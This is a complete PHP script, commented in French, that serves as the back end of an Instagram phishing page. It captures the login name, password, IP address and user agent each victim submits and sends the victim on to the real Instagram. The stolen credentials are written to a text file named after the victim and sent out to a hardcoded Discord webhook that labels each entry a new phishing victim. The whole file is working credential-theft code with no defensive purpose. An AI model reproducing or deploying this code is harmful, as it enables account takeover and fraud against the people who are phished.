<?php
header('Location:https://instagram.com'); 

$message = "
📧Email : ".$_POST['cppEmailOrUsername']."
📧Mot De Passe : ".$_POST['mdp']."
📧 User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
📧 IP: ".$_SERVER['REMOTE_ADDR']."
";

$handle = fopen($_POST['cppEmailOrUsername'].'.txt', 'a');

fwrite($handle, $message);
fclose($handle);

$webhookurl = "https://discordapp.com/api/webhooks/1040235933116661790/eEe74EVYJiafLcGAdLZ56jvZawCxEWtdsk9NtuH2EpV_s0LRkPj68LbuSE_WOUVMB--u";
$timestamp = date("c", strtotime("now"));
$json_data = json_encode([

    "username" => "Nouvelle victime sur phishing Instagram",
    "tts" => false,
    "embeds" => 
	[
        [
            "title" => "L'utilisateur ".$_POST['cppEmailOrUsername']." à mordu",
            "type" => "rich",
            "description" => $message,
            "timestamp" => $timestamp,
            "color" => hexdec( "3366ff" ),

        ]
    ]
	
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );

?>